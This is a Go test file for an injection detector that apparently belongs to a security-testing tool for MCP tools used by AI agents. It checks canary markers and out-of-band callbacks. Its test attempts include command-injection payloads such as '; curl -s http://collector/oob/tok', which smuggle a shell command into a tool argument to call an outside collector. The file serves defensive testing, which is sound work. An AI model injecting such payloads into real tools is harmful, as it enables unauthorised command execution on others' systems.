package mcptool

import (
	"context"
	"testing"

	"github.com/praetorian-inc/augustus/pkg/attempt"
	"github.com/praetorian-inc/augustus/pkg/registry"
)

func newDetector(t *testing.T) *InjectionDetector {
	t.Helper()
	d, err := NewInjectionDetector(registry.Config{})
	if err != nil {
		t.Fatalf("NewInjectionDetector: %v", err)
	}
	return d.(*InjectionDetector)
}

func attemptWith(marker, output string) *attempt.Attempt {
	a := attempt.New("payload")
	if marker != "" {
		a.Metadata[attempt.MetadataKeyInjectionCanaries] = []string{marker}
	}
	a.AddOutput(output)
	return a
}

func TestInjectionDetector(t *testing.T) {
	tests := []struct {
		name string
		a    *attempt.Attempt
		want float64
	}{
		{"marker present -> vuln", attemptWith("401121", "Result: 401121"), 1.0},
		{"marker absent -> safe", attemptWith("401121", "you said: 133707*3"), 0.0},
		{"no canary recorded -> safe", attemptWith("", "401121"), 0.0},
	}

	d := newDetector(t)
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			scores, err := d.Detect(context.Background(), tt.a)
			if err != nil {
				t.Fatalf("Detect: %v", err)
			}
			if len(scores) != 1 || scores[0] != tt.want {
				t.Errorf("Detect = %v, want [%v]", scores, tt.want)
			}
		})
	}
}

// TestInjectionDetector_OOBCallback: the blind command-injection path. An
// out-of-band callback flags the attempt even when no marker is reflected —
// including the fully-blind case where the tool returned no output at all.
func TestInjectionDetector_OOBCallback(t *testing.T) {
	tests := []struct {
		name     string
		marker   string
		callback bool
		outputs  []string
		want     []float64
	}{
		{"blind callback, no output -> single 1.0", "AUGOOBdead", true, nil, []float64{1.0}},
		{"callback with empty output -> 1.0", "AUGOOBdead", true, []string{""}, []float64{1.0}},
		{"reflected marker (non-blind) -> 1.0", "AUGOOBdead", false, []string{"...AUGOOBdead..."}, []float64{1.0}},
		{"no callback, no reflection -> safe", "AUGOOBdead", false, []string{"; curl -s http://x/oob/t"}, []float64{0.0}},
		{"callback but marker reflected too -> 1.0", "AUGOOBdead", true, []string{"got AUGOOBdead"}, []float64{1.0}},
	}

	d := newDetector(t)
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			a := attempt.New("; curl -s http://collector/oob/tok")
			a.Metadata[attempt.MetadataKeyInjectionCanaries] = []string{tt.marker}
			a.Metadata[attempt.MetadataKeyInjectionOOBCallback] = tt.callback
			for _, o := range tt.outputs {
				a.AddOutput(o)
			}
			scores, err := d.Detect(context.Background(), a)
			if err != nil {
				t.Fatalf("Detect: %v", err)
			}
			if len(scores) != len(tt.want) {
				t.Fatalf("len(scores)=%d, want %d (%v)", len(scores), len(tt.want), scores)
			}
			for i := range scores {
				if scores[i] != tt.want[i] {
					t.Errorf("scores=%v, want %v", scores, tt.want)
				}
			}
		})
	}
}

// TestInjectionDetector_ToleratesJSONRoundTrip: metadata read as []any (post
// JSON) still resolves markers.
func TestInjectionDetector_ToleratesJSONRoundTrip(t *testing.T) {
	a := attempt.New("payload")
	a.Metadata[attempt.MetadataKeyInjectionCanaries] = []any{"401121"}
	a.AddOutput("Result: 401121")

	scores, err := newDetector(t).Detect(context.Background(), a)
	if err != nil {
		t.Fatalf("Detect: %v", err)
	}
	if len(scores) != 1 || scores[0] != 1.0 {
		t.Errorf("Detect = %v, want [1]", scores)
	}
}
